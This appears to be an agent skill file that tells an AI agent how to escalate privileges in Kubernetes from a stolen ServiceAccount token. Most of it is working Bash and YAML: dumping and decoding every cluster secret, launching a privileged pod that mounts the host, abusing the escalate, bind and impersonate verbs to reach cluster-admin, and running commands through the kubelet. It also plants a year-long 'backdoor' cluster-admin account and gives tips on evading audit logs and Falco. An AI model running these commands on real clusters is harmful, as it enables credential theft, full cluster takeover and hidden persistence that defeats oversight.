---
name: k8s-rbac-abuse
description: "Kubernetes RBAC privilege escalation paths — ClusterRole/Role enumeration via `kubectl auth can-i --list`, abuse of pods/exec, pods/portforward, secrets get, escalate verb, bind verb, impersonate verb, system:masters group abuse, ServiceAccount token theft and reuse."
allowed-tools: Bash Read Write
metadata:
  when_to_use: "kubernetes k8s rbac role privilege escalation can-i pods/exec secrets list escalate bind impersonate serviceaccount cluster-admin system:masters"
  subdomain: cloud-native
  tags: kubernetes, rbac, privilege-escalation, authorization
  mitre_attack: T1078.004, T1098.003, T1552.005
---

# Kubernetes RBAC Privilege Escalation

You have a Kubernetes ServiceAccount token (from a pod escape, kubeconfig leak, or compromised CI runner). Find the path from this SA to cluster-admin.

## Phase 1: Enumerate current permissions

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc

# Set up kubectl with the stolen token
kubectl config set-credentials hacked --token="$TOKEN"
kubectl config set-cluster c --server=$APISERVER --insecure-skip-tls-verify
kubectl config set-context c --cluster=c --user=hacked --namespace=$NS
kubectl config use-context c

# Enumerate everything you can do
kubectl auth can-i --list                    # in your namespace
kubectl auth can-i --list --all-namespaces   # cluster-wide (often forbidden — that's a signal too)
kubectl auth can-i '*' '*' --all-namespaces  # are you cluster-admin?

# Get your role bindings
kubectl get rolebindings,clusterrolebindings -A -o json | jq '.items[] | select(.subjects[]?.name | contains("YOUR_SA_NAME"))'
```

## Phase 2: Classic escalation paths

### 2.1 `pods/exec` or `pods/attach` on a privileged pod

If you can `exec` into a pod that has a privileged SecurityContext or a sensitive volume mount, you take that pod's identity:

```bash
# Find pods you can exec into
kubectl auth can-i create pods/exec
# Find privileged pods
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[]?.securityContext?.privileged == true) | "\(.metadata.namespace)/\(.metadata.name)"'

# Exec → escape (see k8s-pod-escape skill)
kubectl exec -it -n kube-system privileged-pod-name -- /bin/sh
```

### 2.2 `secrets get/list` cluster-wide

```bash
# Dump every secret in the cluster
kubectl get secrets -A -o json > all_secrets.json
# Service-account tokens, image-pull secrets, custom-application secrets — all here
jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") | "\(.metadata.namespace)/\(.metadata.name): \(.data.token | @base64d)"' all_secrets.json | head

# Pick a more-privileged SA token and re-authenticate
NEW_TOKEN=$(kubectl get secret -n kube-system $(kubectl get sa -n kube-system -o name | head -1 | cut -d/ -f2)-token-XXXXX -o jsonpath='{.data.token}' | base64 -d)
kubectl --token="$NEW_TOKEN" auth can-i '*' '*' --all-namespaces
```

### 2.3 `create pods` — run a privileged pod yourself

Even without exec on existing pods, if you can CREATE pods you can build one that mounts the host:

```bash
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pwn
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p", "sh"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
kubectl exec -it pwn -- /bin/sh
```

If PSP / Pod Security Admission blocks `privileged: true`, downgrade gradually: hostPath: /, hostPID alone, capabilities: [SYS_ADMIN], etc. PSA's `restricted` profile blocks all of these; `baseline` blocks privileged + hostPath but allows hostPID; `privileged` allows everything.

### 2.4 `escalate` verb

The `escalate` verb on `roles`/`clusterroles` lets you create a role with permissions you DON'T have:

```bash
kubectl auth can-i escalate clusterroles
# If "yes":
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: total-pwn
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF
# Then bind it to your SA
kubectl create clusterrolebinding pwn --clusterrole=total-pwn --serviceaccount=$NS:default
```

### 2.5 `bind` verb

The `bind` verb lets you bind an existing higher-privilege ClusterRole to your SA:

```bash
kubectl auth can-i create clusterrolebindings
# OR
kubectl auth can-i bind clusterroles
# Either gives you escalation to cluster-admin:
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=$NS:default
```

### 2.6 `impersonate` verb

```bash
kubectl auth can-i impersonate users
# If yes, impersonate cluster-admin:
kubectl --as=system:admin auth can-i '*' '*' --all-namespaces
kubectl --as=system:admin get secrets -A
# Or impersonate a group:
kubectl --as=anything --as-group=system:masters get secrets -A
```

### 2.7 `nodes/proxy` — bypass RBAC via kubelet

```bash
kubectl auth can-i get nodes/proxy
# If yes, talk to the kubelet directly (bypasses the API server's RBAC)
kubectl proxy --port=8080 &
curl -sk http://localhost:8080/api/v1/nodes/$NODE/proxy/run/POD_NS/POD_NAME/CONTAINER -X POST -d 'cmd=id'
```

## Phase 3: Token persistence

```bash
# Create a long-lived SA token (k8s 1.24+ doesn't auto-mount tokens forever)
kubectl create token your-sa --duration=720h    # 30-day token

# Or create an SA + ClusterRoleBinding pair that survives revocation of yours
kubectl create sa backdoor -n kube-system
kubectl create clusterrolebinding backdoor --clusterrole=cluster-admin --serviceaccount=kube-system:backdoor
TOKEN=$(kubectl create token backdoor -n kube-system --duration=8760h)   # 1 year
```

## OPSEC

- Every `kubectl` call hits the API server audit log. `kubectl auth can-i --list` calls SelfSubjectRulesReview — distinctive in audit logs.
- Falco and Sysdig rules flag `create-clusterrolebinding`, `impersonate`, and `nodes/proxy` access.
- Token theft from etcd / pod-filesystem leaves no audit trail until the token is USED — separate the steal and the use in time if possible.
- Prefer `--user-agent` matching the kubectl version already in use on the cluster to blend in.

## References

- [Kubernetes RBAC docs](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- BadPods (Bishop Fox) — every PSA bypass class
- DEFCON 30 "Hacking Kubernetes" — Madhu Akula / Andrew Martin
- KubiScan — tools for the defender side
